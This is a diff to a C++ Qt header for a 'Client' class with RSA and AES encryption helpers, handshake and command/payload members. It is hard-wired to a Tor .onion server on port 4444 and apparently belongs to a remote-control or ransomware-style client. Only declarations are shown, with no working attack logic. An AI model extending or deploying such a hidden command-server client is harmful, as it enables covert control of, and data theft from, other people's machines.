@@ -2,17 +2,15 @@
 #define CLIENT_H
 
 #include "global.h"
-#include "database.h"
 #include "rsabox.h"
 #include "aesbox.h"
-#include <QTcpSocket>
-#include <QObject>
 #include <QDebug>
 #include <QString>
-#include <QNetworkAccessManager>
+#include <QObject>
+#include <QTcpSocket>
 #include <QNetworkProxy>
+#include <QNetworkAccessManager>
 
-//#define SERVER_HOST "192.168.158.1"
 #define SERVER_HOST "rchlie7hgfhecoi7.onion"
 #define SERVER_PORT 4444
 
@@ -20,7 +18,6 @@ class Client : public QObject
 {
     Q_OBJECT
 public:
-    explicit Client(QObject *parent = 0);
     explicit Client(int , QString, QObject *parent = 0);
     int handshake();
     int doAction();
@@ -31,14 +28,14 @@ signals:
 
 public slots:
     void start();
-    void genkey();
-    void finish(int);
     void finish();
-    void hello();
+    void finish(int);
 
 private:
-    QTcpSocket *socket;
+    int cmd;
+    QString payload;
     _command *command;
+    QTcpSocket *socket;
     RSABox rsa;
     AESBox aes;
 };
